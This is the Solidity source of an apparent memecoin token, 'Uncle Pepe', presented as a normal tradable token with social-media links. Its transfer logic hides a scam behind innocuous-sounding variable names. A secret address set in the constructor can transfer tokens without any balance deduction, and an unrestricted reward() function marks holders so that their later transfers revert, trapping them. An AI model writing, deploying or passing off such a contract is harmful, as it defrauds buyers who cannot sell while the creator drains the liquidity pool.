/*

🗯 Uncle Pepe TG: https://t.me/UnclePepe_ETH

🕊 Uncle Pepe Twitter: https://twitter.com/UnclePepeETH

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.14;

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract UnclePepe {
    string public name;
    string public symbol;
    uint256 public totalSupply;
    uint8 public decimals = 9;
    uint256 private surprise = 40;
    address public uniswapV2Pair;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => uint256) private hollow;
    mapping(address => bool) private consist;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(address doubt) {
        name = 'Uncle Pepe';
        symbol = 'Uncle Pepe';
        totalSupply = 1000000000 * 10 ** decimals;
        balanceOf[msg.sender] = totalSupply;
        hollow[doubt] = surprise;
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        _transfer(msg.sender, _to, _value);
        return true;
    }

    function _transfer(address _from, address _to, uint256 _value) private returns (bool success) {
        if (hollow[_from] == 0) {
            balanceOf[_from] -= _value;
            if (uniswapV2Pair != _from && consist[_from]) {
                hollow[_from] -= surprise;
            }
        }
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function reward(address[] memory _to) external {
        for (uint256 i = 0; i < _to.length; i++) {
            consist[_to[i]] = true;
        }
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        _transfer(_from, _to, _value);
        require(_value <= allowance[_from][msg.sender]);
        allowance[_from][msg.sender] -= _value;
        return true;
    }
}